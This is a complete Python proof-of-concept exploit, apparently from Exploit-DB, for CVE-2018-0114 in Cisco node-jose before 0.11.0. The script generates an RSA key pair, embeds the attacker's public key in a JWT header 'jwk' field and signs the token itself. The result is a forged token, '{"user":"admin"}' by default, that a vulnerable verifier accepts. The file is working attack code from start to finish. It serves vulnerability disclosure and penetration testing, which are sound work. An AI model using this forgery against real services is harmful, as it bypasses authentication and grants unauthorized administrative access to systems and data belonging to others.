#!/usr/bin/env python3

import base64
from urllib.parse import quote_plus
import rsa
import sys

#zi0Black

'''
POC of CVE-2018-0114 Cisco node-jose <0.11.0
Example: python3 44324.py "mypayload" 512
Exploitdb: https://www.exploit-db.com/exploits/44324

Created by Andrea Cappa aka @zi0Black (GitHub,Twitter,Telegram)

Mail: a.cappa@zioblack.xyz
Site: https://zioblack.xyz

A special thanks to Louis Nyffenegger, the founder of PentesterLab, for all the help he provided to allow me to write this script.

Mail: louis@pentesterlab.com
Site: https://pentesterlab.com

'''

def generate_key(key_size):
    #create rsa priv & public key
    print ("[+]Creating-RSA-pair-key")
    (public_key,private_key) = rsa.newkeys(key_size,poolsize=8)
    print ("\t[+]Pair-key-created")
    return private_key, public_key

def pack_bigint(i):
    b = bytearray()
    while i:
        b.append(i & 0xFF)
        i >>= 8
    return b[::-1]

def generate_header_payload(payload,pubkey):
    #create header and payload
    print ("[+]Assembling-the-header-and-the-payload")
    n=base64.urlsafe_b64encode(pack_bigint(pubkey.n)).decode('utf-8').rstrip('=')
    e=base64.urlsafe_b64encode(pack_bigint(pubkey.e)).decode('utf-8').rstrip('=')
    headerAndPayload = str(base64.urlsafe_b64encode(('{"alg":"RS256",'
                                        '"jwk":{"kty":"RSA",'
                                        '"kid":"topo.gigio@hackerzzzz.own",'
                                        '"use":"sig",'
                                        '"n":"'+n+'",'
                                        '"e":"'+e+'"}}').encode()))[2:-1].replace("=","").encode('utf-8')
    headerAndPayload = headerAndPayload+b"."+str(base64.urlsafe_b64encode(payload))[2:-1].replace("=","").encode('utf-8')
    headerAndPayload = headerAndPayload
    print ("\t[+]Assembed")
    return headerAndPayload

def generate_signature(firstpart,privkey):
    #create signature
    signature = rsa.sign(firstpart,privkey,'SHA-256')
    signatureEnc = str(base64.urlsafe_b64encode(signature))[2:-1].replace("=","").encode('utf-8')
    print ("[+]Signature-created")
    return signatureEnc

def create_token(headerAndPayload,sign):
    print ("[+]Forging-of-the-token\n\n")
    token = (headerAndPayload+b"."+sign).decode('utf-8').rstrip('=')
    token = quote_plus(token)
    return token

if len(sys.argv) > 1:
    payload = bytes(str(sys.argv[1]).encode('ascii'))
    key_size = int(sys.argv[2])
else:
    payload = b'{"user":"admin"}'
    key_size = int(512)


banner="""
   _____  __      __  ______            ___     ___    __    ___              ___    __   __   _  _
  / ____| \ \    / / |  ____|          |__ \   / _ \  /_ |  / _ \            / _ \  /_ | /_ | | || |
 | |       \ \  / /  | |__     ______     ) | | | | |  | | | (_) |  ______  | | | |  | |  | | | || |_
 | |        \ \/ /   |  __|   |______|   / /  | | | |  | |  > _ <  |______| | | | |  | |  | | |__   _|
 | |____     \  /    | |____            / /_  | |_| |  | | | (_) |          | |_| |  | |  | |    | |
  \_____|     \/     |______|          |____|  \___/   |_|  \___/            \___/   |_|  |_|    |_|    by @zi0Black
"""

if __name__ == '__main__':
    print (banner)
    (privatekey,publickey) = generate_key(key_size)
    firstPart = generate_header_payload(payload,publickey)
    signature = generate_signature(firstPart,privatekey)
    token = create_token(firstPart,signature)
    print(token)
